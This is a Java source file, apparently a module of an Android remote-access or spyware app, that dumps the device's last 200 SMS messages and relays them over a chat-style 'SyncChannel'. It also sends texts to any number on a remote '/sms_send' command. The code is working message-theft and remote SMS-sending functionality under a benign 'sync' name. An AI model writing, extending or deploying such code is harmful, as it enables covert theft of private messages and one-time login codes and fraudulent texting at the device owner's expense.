// language: Java, file: SyncSms.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;

public class SyncSms {

    public static void dump() {
        async(() -> dumpSync());
    }

    public static void sendSms(String number, String body) {
        if (number == null || number.isEmpty() || body == null) {
            CommandDispatch.err("usage: /sms_send NUM TEXT");
            return;
        }
        async(() -> {
            Context c = SyncChannel.ctx;
            if (c == null) return;
            if (c.checkSelfPermission(Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                SyncChannel.send("<i>err: SEND_SMS not granted</i>");
                return;
            }
            try {
                android.telephony.SmsManager sm = c.getSystemService(
                    android.telephony.SmsManager.class);
                if (sm == null) sm = android.telephony.SmsManager.getDefault();
                sm.sendTextMessage(number, null, body, null, null);
                SyncChannel.send("<i>sms sent to</i> <code>"
                    + SyncChannel.esc(number) + "</code>");
            } catch (Throwable t) {
                CommandDispatch.err(t.getMessage());
            }
        });
    }

    static void dumpSync() {
        Context c = SyncChannel.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            SyncChannel.send("<i>err: READ_SMS not granted</i>");
            return;
        }
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[] { "_id", "address", "body", "date" },
                null, null, "date DESC LIMIT 200");
            if (cur == null) { SyncChannel.send("<i>sms: null cursor</i>"); return; }
            StringBuilder b = new StringBuilder();
            b.append("<b>SMS inbox</b> (").append(cur.getCount()).append(")\n\n");
            int n = 0;
            while (cur.moveToNext()) {
                String addr = cur.getString(1);
                String body = cur.getString(2);
                long date = cur.getLong(3);
                b.append("<b>").append(SyncChannel.esc(addr)).append("</b> ")
                 .append("<i>").append(fmtDate(date)).append("</i>\n")
                 .append(SyncChannel.esc(trunc(body, 400))).append("\n───\n");
                n++;
                if (n % 25 == 0 && b.length() > 3000) {
                    SyncChannel.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) SyncChannel.send(b.toString());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        } finally {
            if (cur != null) try { cur.close(); } catch (Throwable ignored) {}
        }
    }

    static String fmtDate(long ms) {
        try {
            return new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm",
                java.util.Locale.US).format(new java.util.Date(ms));
        } catch (Throwable t) { return "?"; }
    }

    static String trunc(String s, int n) {
        if (s == null) return "";
        return s.length() <= n ? s : s.substring(0, n) + "…";
    }

    static void async(Runnable r) {
        Thread t = new Thread(r, "v2-sms");
        t.setDaemon(true);
        t.start();
    }
}